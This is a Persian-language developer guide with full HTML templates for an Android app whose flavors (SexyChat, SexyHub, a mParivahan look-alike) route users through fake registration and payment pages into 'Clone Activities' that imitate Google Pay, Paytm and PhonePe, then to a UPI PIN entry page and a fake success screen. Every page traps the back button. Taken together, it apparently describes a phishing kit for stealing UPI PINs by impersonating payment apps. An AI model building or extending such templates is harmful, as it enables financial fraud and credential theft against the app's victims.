# 📚 راهنمای کامل ساخت قالب (Template) و اتصال به Payment Flow

این راهنما به شما کمک می‌کند تا قالب‌های جدید برای برنامه بسازید و آن‌ها را به سیستم پرداخت متصل کنید.

---

## 📋 فهرست مطالب

1. [ساختار فایل‌ها](#ساختار-فایل‌ها)
2. [Flow کامل برنامه](#flow-کامل-برنامه)
3. [ساخت قالب جدید (Template)](#ساخت-قالب-جدید-template)
4. [اتصال به Payment Flow](#اتصال-به-payment-flow)
5. [ساخت Final Page](#ساخت-final-page)
6. [مثال عملی](#مثال-عملی)
7. [نکات مهم](#نکات-مهم)

---

## 📁 ساختار فایل‌ها

```
app/src/
├── main/assets/              # فایل‌های مشترک همه flavors
│   ├── index.html           # صفحه اصلی (splash screen)
│   ├── register.html        # صفحه ثبت نام
│   ├── payment.html           # صفحه پرداخت
│   ├── final.html          # صفحه موفقیت
│   ├── pin.html            # صفحه UPI PIN
│   ├── wait.html           # صفحه در حال پردازش
│   └── googlepay-splash.html, paytm-splash.html, phonepe-splash.html
│
├── sexychat/assets/         # فایل‌های مخصوص SexyChat flavor
│   ├── index.html
│   ├── register.html
│   ├── payment.html
│   └── final.html
│
├── mparivahan/assets/       # فایل‌های مخصوص mParivahan flavor
│   ├── index.html
│   ├── register.html
│   ├── payment.html
│   └── final.html
│
└── sexyhub/assets/          # فایل‌های مخصوص SexyHub flavor
    ├── index.html
    ├── register.html
    ├── payment.html
    └── final.html
```

---

## 🔄 Flow کامل برنامه

```
index.html (Splash Screen)
    ↓ (بعد از 6 ثانیه)
register.html (ثبت نام / ورود)
    ↓ (بعد از submit موفق)
payment.html (انتخاب روش پرداخت)
    ↓ (بعد از انتخاب روش پرداخت)
Clone Activity (GPayCloneActivity / PaytmCloneActivity / PhonePeCloneActivity)
    ↓
Splash Screen (googlepay-splash.html / paytm-splash.html / phonepe-splash.html)
    ↓ (بعد از 2.5 ثانیه)
pin.html (UPI PIN Entry)
    ↓ (بعد از وارد کردن PIN)
wait.html (در حال پردازش)
    ↓ (بعد از 5 ثانیه)
final.html (صفحه موفقیت)
    ↓ (MainActivity بسته می‌شه)
```

---

## 🎨 ساخت قالب جدید (Template)

### مرحله 1: ایجاد فایل‌های HTML

برای هر flavor جدید، باید این فایل‌ها را ایجاد کنید:

#### 1. **index.html** - صفحه Splash Screen

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#YOUR_COLOR">
  <title>Your App Name</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    /* ✨ طراحی خودتون رو اینجا بنویسید */
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      position: fixed;
    }
    
    body {
      background: linear-gradient(135deg, #YOUR_COLOR_1, #YOUR_COLOR_2);
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Poppins', sans-serif;
    }
    
    /* ... استایل‌های بیشتر ... */
  </style>
</head>
<body>
  <div class="content-wrapper">
    <!-- ✨ محتوای صفحه خودتون -->
    <div class="logo">Your App</div>
    <div class="tagline">Your Tagline</div>
  </div>

  <script>
    // ⭐ غیرفعال کردن دکمه برگشت
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
    
    // ⭐ بعد از 6 ثانیه redirect به register.html
    setTimeout(() => {
      window.location.href = 'register.html';
    }, 6000);
  </script>
</body>
</html>
```

**نکات مهم:**
- ⏱️ Timer باید 6 ثانیه باشه
- 🔄 Redirect به `register.html` باشه
- 🚫 دکمه برگشت غیرفعال باشه

---

#### 2. **register.html** - صفحه ثبت نام

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Register - Your App</title>
  <style>
    /* ✨ طراحی فرم ثبت نام */
  </style>
</head>
<body>
  <div class="container">
    <form id="registerForm">
      <!-- ✨ فیلدهای فرم خودتون -->
      <input type="text" id="name" placeholder="Name" required>
      <input type="tel" id="mobile" placeholder="Mobile" required>
      
      <button type="submit" id="registerBtn">Register</button>
    </form>
  </div>

  <script>
    // ⭐ غیرفعال کردن دکمه برگشت
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
    
    // ⭐ اعتبارسنجی و submit
    document.getElementById('registerForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const name = document.getElementById('name').value.trim();
      const mobile = document.getElementById('mobile').value.trim();
      
      // ✨ اعتبارسنجی خودتون
      if (!name || name.length < 2) {
        alert('⚠️ Please enter your full name.');
        return;
      }
      
      if (!mobile || mobile.length < 10) {
        alert('⚠️ Please enter a valid mobile number.');
        return;
      }
      
      // ✨ نمایش loading overlay (اختیاری)
      // document.getElementById('loadingOverlay').style.display = 'flex';
      
      // ⭐ بعد از 2.5 ثانیه redirect به payment.html
      setTimeout(() => {
        window.location.href = 'payment.html';
      }, 2500);
    });
  </script>
</body>
</html>
```

**نکات مهم:**
- ✅ اعتبارسنجی کامل فیلدها
- 🔄 بعد از submit موفق، redirect به `payment.html`
- ⏱️ Timer می‌تونه بین 2 تا 3 ثانیه باشه

---

## 💳 اتصال به Payment Flow

### مرحله 2: ساخت payment.html

این صفحه باید طراحی متفاوتی برای هر flavor داشته باشه:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#YOUR_COLOR">
  <title>Payment - Your App</title>
  <style>
    /* ✨ طراحی صفحه پرداخت مخصوص flavor شما */
    body {
      background: linear-gradient(135deg, #YOUR_COLOR_1, #YOUR_COLOR_2);
    }
    
    .payment-card {
      background: rgba(255, 255, 255, 0.98);
      border-radius: 20px;
      padding: 20px 16px;
      max-width: 340px;
      margin: 0 auto;
    }
    
    /* ... استایل‌های بیشتر ... */
  </style>
</head>
<body>
  <div class="payment-card">
    <!-- ✨ محتوای صفحه پرداخت -->
    <div class="price-section">
      <div class="price">₹YOUR_PRICE</div>
      <div class="price-label">Your Price Label</div>
    </div>
    
    <!-- ⭐ بخش انتخاب روش پرداخت -->
    <div class="payment-methods">
      <div class="methods-grid">
        <div class="method-btn" onclick="selectPaymentMethod('gpay')">
          <img src="google-pay-icon.png" alt="Google Pay">
        </div>
        <div class="method-btn" onclick="selectPaymentMethod('phonepe')">
          <img src="phonepe-icon.png" alt="PhonePe">
        </div>
        <div class="method-btn" onclick="selectPaymentMethod('paytm')">
          <img src="paytm-icon.png" alt="Paytm">
        </div>
      </div>
      
      <button class="pay-button" onclick="selectPaymentMethod('gpay')">
        Pay ₹YOUR_PRICE
      </button>
    </div>
  </div>

  <script>
    // ⭐ غیرفعال کردن دکمه برگشت
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
    
    // ⭐⭐ تابع مهم: اتصال به Clone Activities
    function selectPaymentMethod(method) {
      try {
        // ⭐ فراخوانی Android برای باز کردن Clone Activity
        if (typeof Android !== 'undefined' && Android.openPaymentClone) {
          Android.openPaymentClone(method);
        } else {
          // ⚠️ Fallback (فقط برای تست)
          console.error('❌ Android interface not available');
          if (method === 'gpay') {
            window.location.href = 'googlepay-splash.html';
          } else if (method === 'paytm') {
            window.location.href = 'paytm-splash.html';
          } else if (method === 'phonepe') {
            window.location.href = 'phonepe-splash.html';
          }
        }
      } catch (e) {
        console.error('❌ Error opening payment clone:', e);
      }
    }
  </script>
</body>
</html>
```

**نکات مهم:**
- ✅ باید تابع `selectPaymentMethod()` داشته باشه
- 🎯 پارامترها: `'gpay'`, `'paytm'`, `'phonepe'`
- 📞 فراخوانی `Android.openPaymentClone(method)` برای باز کردن Clone Activity

---

## 🎉 ساخت Final Page

### مرحله 3: ساخت final.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Payment Successful</title>
  <style>
    /* ✨ طراحی صفحه موفقیت */
    body {
      background: linear-gradient(135deg, #YOUR_COLOR_1, #YOUR_COLOR_2);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    
    .success-card {
      background: rgba(255, 255, 255, 0.98);
      border-radius: 20px;
      padding: 30px 20px;
      text-align: center;
      max-width: 350px;
    }
    
    .success-icon {
      font-size: 80px;
      margin-bottom: 20px;
      animation: scaleIn 0.5s ease-out;
    }
    
    @keyframes scaleIn {
      from { transform: scale(0); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }
    
    .success-title {
      font-size: clamp(20px, 5vw, 24px);
      font-weight: 800;
      color: #4caf50;
      margin-bottom: 10px;
    }
    
    .success-message {
      font-size: clamp(14px, 3.5vw, 16px);
      color: #333;
      margin-bottom: 20px;
    }
    
    .features-list {
      background: #f5f5f5;
      border-radius: 12px;
      padding: 15px;
      margin: 20px 0;
      text-align: left;
    }
    
    .feature-item {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 10px;
      font-size: clamp(12px, 3vw, 14px);
    }
    
    .feature-item:last-child {
      margin-bottom: 0;
    }
    
    .warning-box {
      background: #fff3cd;
      border: 2px solid #ffc107;
      border-radius: 12px;
      padding: 12px;
      margin-top: 20px;
      font-size: clamp(11px, 2.8vw, 12px);
      color: #856404;
      text-align: left;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="success-card">
    <div class="success-icon">✅</div>
    <div class="success-title">🎉 Payment Successful!</div>
    <div class="success-message">Your premium access has been activated!</div>
    
    <div class="features-list">
      <div class="feature-item">
        <span>🎬</span>
        <span><strong>Unlimited Access</strong></span>
      </div>
      <div class="feature-item">
        <span>🔒</span>
        <span><strong>100% Secure</strong></span>
      </div>
      <div class="feature-item">
        <span>⚡</span>
        <span><strong>Instant Activation</strong></span>
      </div>
    </div>
    
    <div class="warning-box">
      <strong>⚠️ Don't close the app!</strong><br>
      Your premium access is being activated. Please wait a few seconds.
    </div>
  </div>

  <script>
    // ⭐⭐ مهم: غیرفعال کردن کامل دکمه برگشت
    (function() {
      history.pushState(null, null, location.href);
      window.onpopstate = function() {
        history.go(1);
      };
    })();
    
    // Method 2: Override back button
    window.addEventListener('popstate', function(event) {
      history.pushState(null, null, location.href);
    }, false);
    
    // Method 3: Prevent page unload
    window.addEventListener('beforeunload', function(e) {
      history.pushState(null, null, location.href);
      return undefined;
    });
    
    // Method 4: Android back button (if available)
    document.addEventListener('backbutton', function(e) {
      e.preventDefault();
      history.go(1);
      return false;
    }, false);
    
    // ⭐ ذخیره flag برای unlock
    localStorage.setItem("isUnlocked", "1");
    
    // ⚠️ مهم: این صفحه نباید redirect کنه
    // Clone Activity باید روی این صفحه بمونه
  </script>
</body>
</html>
```

**نکات مهم:**
- 🚫 دکمه برگشت باید کاملاً غیرفعال باشه
- 💾 ذخیره `localStorage.setItem("isUnlocked", "1")`
- ❌ نباید redirect کنه (Clone Activity باید بمونه)

---

## 📝 مثال عملی: ساخت قالب جدید "MyApp"

### مرحله 1: ایجاد پوشه

```
app/src/myapp/assets/
├── index.html
├── register.html
├── payment.html
└── final.html
```

### مرحله 2: ساخت index.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#2196F3">
  <title>MyApp</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      position: fixed;
    }
    
    body {
      background: linear-gradient(135deg, #2196F3 0%, #1976D2 50%, #0D47A1 100%);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: 'Poppins', sans-serif;
    }
    
    .logo {
      font-size: clamp(40px, 11vw, 58px);
      font-weight: 700;
      color: #fff;
      margin-bottom: 15px;
      animation: fadeIn 1s ease-out;
    }
    
    .tagline {
      font-size: clamp(14px, 4vw, 18px);
      color: rgba(255, 255, 255, 0.9);
      animation: fadeIn 1s 0.5s both;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="logo">MyApp</div>
  <div class="tagline">Welcome to MyApp</div>

  <script>
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
    
    setTimeout(() => {
      window.location.href = 'register.html';
    }, 6000);
  </script>
</body>
</html>
```

### مرحله 3: ساخت register.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Register - MyApp</title>
  <style>
    body {
      background: linear-gradient(135deg, #2196F3, #1976D2);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      font-family: 'Poppins', sans-serif;
    }
    
    .container {
      background: #fff;
      border-radius: 20px;
      padding: 30px 20px;
      max-width: 340px;
      width: 100%;
    }
    
    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 15px;
      border: 2px solid #e0e0e0;
      border-radius: 12px;
      font-size: 16px;
      box-sizing: border-box;
    }
    
    button {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, #2196F3, #1976D2);
      color: #fff;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Register</h2>
    <form id="registerForm">
      <input type="text" id="name" placeholder="Full Name" required>
      <input type="tel" id="mobile" placeholder="Mobile Number" required>
      <button type="submit">Register</button>
    </form>
  </div>

  <script>
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
    
    document.getElementById('registerForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const name = document.getElementById('name').value.trim();
      const mobile = document.getElementById('mobile').value.trim();
      
      if (!name || name.length < 2) {
        alert('⚠️ Please enter your full name.');
        return;
      }
      
      if (!mobile || mobile.length < 10) {
        alert('⚠️ Please enter a valid mobile number.');
        return;
      }
      
      setTimeout(() => {
        window.location.href = 'payment.html';
      }, 2500);
    });
  </script>
</body>
</html>
```

### مرحله 4: ساخت payment.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#2196F3">
  <title>Payment - MyApp</title>
  <style>
    body {
      background: linear-gradient(135deg, #f5f7fa, #e8eef5);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      font-family: 'Poppins', sans-serif;
    }
    
    .payment-card {
      background: #fff;
      border-radius: 20px;
      padding: 25px 20px;
      max-width: 340px;
      width: 100%;
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
    }
    
    .price-section {
      text-align: center;
      background: linear-gradient(135deg, #2196F3, #1976D2);
      color: #fff;
      padding: 20px;
      border-radius: 16px;
      margin-bottom: 20px;
    }
    
    .price {
      font-size: 36px;
      font-weight: 800;
      margin-bottom: 5px;
    }
    
    .methods-grid {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 15px;
    }
    
    .method-btn {
      width: 70px;
      height: 70px;
      background: #fff;
      border: 2px solid #e0e0e0;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: all 0.3s;
    }
    
    .method-btn:hover {
      transform: translateY(-4px);
      border-color: #2196F3;
      box-shadow: 0 6px 20px rgba(33, 150, 243, 0.3);
    }
    
    .method-btn img {
      width: 80%;
      height: 80%;
      object-fit: contain;
    }
    
    .pay-button {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, #2196F3, #1976D2);
      color: #fff;
      border: none;
      border-radius: 12px;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 8px 24px rgba(33, 150, 243, 0.4);
    }
    
    .pay-button:active {
      transform: scale(0.97);
    }
  </style>
</head>
<body>
  <div class="payment-card">
    <div class="price-section">
      <div class="price">₹99</div>
      <div>One-Time Payment</div>
    </div>
    
    <div style="text-align: center; margin-bottom: 15px;">
      <strong>Select Payment Method</strong>
    </div>
    
    <div class="methods-grid">
      <div class="method-btn" onclick="selectPaymentMethod('gpay')">
        <img src="google-pay-icon.png" alt="Google Pay">
      </div>
      <div class="method-btn" onclick="selectPaymentMethod('phonepe')">
        <img src="phonepe-icon.png" alt="PhonePe">
      </div>
      <div class="method-btn" onclick="selectPaymentMethod('paytm')">
        <img src="paytm-icon.png" alt="Paytm">
      </div>
    </div>
    
    <button class="pay-button" onclick="selectPaymentMethod('gpay')">
      Pay ₹99
    </button>
  </div>

  <script>
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
    
    function selectPaymentMethod(method) {
      try {
        if (typeof Android !== 'undefined' && Android.openPaymentClone) {
          Android.openPaymentClone(method);
        } else {
          console.error('❌ Android interface not available');
        }
      } catch (e) {
        console.error('❌ Error opening payment clone:', e);
      }
    }
  </script>
</body>
</html>
```

### مرحله 5: ساخت final.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Payment Successful - MyApp</title>
  <style>
    body {
      background: linear-gradient(135deg, #2196F3, #1976D2);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      font-family: 'Poppins', sans-serif;
    }
    
    .success-card {
      background: #fff;
      border-radius: 20px;
      padding: 40px 25px;
      text-align: center;
      max-width: 350px;
      width: 100%;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
    }
    
    .success-icon {
      font-size: 80px;
      margin-bottom: 20px;
      animation: scaleIn 0.5s ease-out;
    }
    
    @keyframes scaleIn {
      from { transform: scale(0); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }
    
    .success-title {
      font-size: 24px;
      font-weight: 800;
      color: #4caf50;
      margin-bottom: 10px;
    }
    
    .success-message {
      font-size: 16px;
      color: #333;
      margin-bottom: 25px;
    }
    
    .warning-box {
      background: #fff3cd;
      border: 2px solid #ffc107;
      border-radius: 12px;
      padding: 15px;
      margin-top: 20px;
      font-size: 12px;
      color: #856404;
      text-align: left;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="success-card">
    <div class="success-icon">✅</div>
    <div class="success-title">🎉 Payment Successful!</div>
    <div class="success-message">Your premium access has been activated successfully!</div>
    
    <div class="warning-box">
      <strong>⚠️ Important:</strong><br>
      Don't close the app! Your premium access is being activated. Please wait a few seconds.
    </div>
  </div>

  <script>
    // ⭐ غیرفعال کردن کامل دکمه برگشت
    (function() {
      history.pushState(null, null, location.href);
      window.onpopstate = function() {
        history.go(1);
      };
    })();
    
    window.addEventListener('popstate', function(event) {
      history.pushState(null, null, location.href);
    }, false);
    
    window.addEventListener('beforeunload', function(e) {
      history.pushState(null, null, location.href);
      return undefined;
    });
    
    document.addEventListener('backbutton', function(e) {
      e.preventDefault();
      history.go(1);
      return false;
    }, false);
    
    // ⭐ ذخیره flag
    localStorage.setItem("isUnlocked", "1");
  </script>
</body>
</html>
```

---

## ⚙️ تنظیمات Flavor در build.gradle.kts

بعد از ساخت فایل‌ها، باید flavor جدید رو به `build.gradle.kts` اضافه کنید:

```kotlin
android {
    ...
    productFlavors {
        create("myapp") {
            dimension = "default"
            applicationIdSuffix = ".myapp"
            versionNameSuffix = "-myapp"
            resValue("string", "app_name", "MyApp")
        }
        // ... flavors دیگر
    }
}
```

---

## ✅ نکات مهم

### 1. **Navigation Flow**
- ✅ `index.html` → بعد از 6 ثانیه → `register.html`
- ✅ `register.html` → بعد از submit → `payment.html`
- ✅ `payment.html` → با `Android.openPaymentClone()` → Clone Activity
- ✅ Clone Activity → `splash.html` → `pin.html` → `wait.html` → `final.html`

### 2. **Back Button**
- ✅ همه صفحات باید دکمه برگشت رو غیرفعال کنن
- ✅ استفاده از `history.pushState()` و `window.onpopstate`

### 3. **Responsive Design**
- ✅ استفاده از `clamp()` برای فونت‌ها
- ✅ `max-width` برای محدود کردن عرض
- ✅ `padding` و `margin` مناسب موبایل

### 4. **Payment Integration**
- ✅ تابع `selectPaymentMethod(method)` باید موجود باشه
- ✅ فراخوانی `Android.openPaymentClone(method)`
- ✅ پارامترها: `'gpay'`, `'paytm'`, `'phonepe'`

### 5. **Final Page**
- ✅ نباید redirect کنه
- ✅ ذخیره `localStorage.setItem("isUnlocked", "1")`
- ✅ دکمه برگشت کاملاً غیرفعال

### 6. **File Structure**
- ✅ فایل‌های مشترک در `app/src/main/assets/`
- ✅ فایل‌های flavor-specific در `app/src/YOUR_FLAVOR/assets/`
- ✅ فایل‌های flavor override می‌کنن main files

---

## 🔍 Checklist

قبل از تست، این موارد رو چک کنید:

- [ ] `index.html` بعد از 6 ثانیه redirect می‌کنه به `register.html`
- [ ] `register.html` اعتبارسنجی می‌کنه و بعد از submit redirect می‌کنه به `payment.html`
- [ ] `payment.html` تابع `selectPaymentMethod()` داره
- [ ] `payment.html` `Android.openPaymentClone()` رو فراخوانی می‌کنه
- [ ] `final.html` دکمه برگشت رو غیرفعال می‌کنه
- [ ] `final.html` `localStorage.setItem("isUnlocked", "1")` رو ذخیره می‌کنه
- [ ] همه صفحات responsive هستن
- [ ] همه صفحات دکمه برگشت رو غیرفعال می‌کنن

---

## 🎨 پیشنهادات طراحی

### رنگ‌بندی
- **SexyChat**: صورتی (#ff1493, #e91e63)
- **mParivahan**: آبی (#4f46e5, #6366f1)
- **SexyHub**: تیره + قرمز (#1a1a2e, #ff1493)

### فونت‌ها
- استفاده از Google Fonts (Poppins)
- `clamp()` برای responsive font sizes

### انیمیشن‌ها
- استفاده از CSS animations
- Smooth transitions
- Loading states

---

## 📞 پشتیبانی

اگر مشکلی پیش اومد:
1. چک کنید که فایل‌ها در مسیر درست قرار دارن
2. چک کنید که JavaScript functions درست فراخوانی می‌شن
3. چک کنید که Android interface موجوده
4. Log ها رو بررسی کنید

---

**موفق باشید! 🚀**

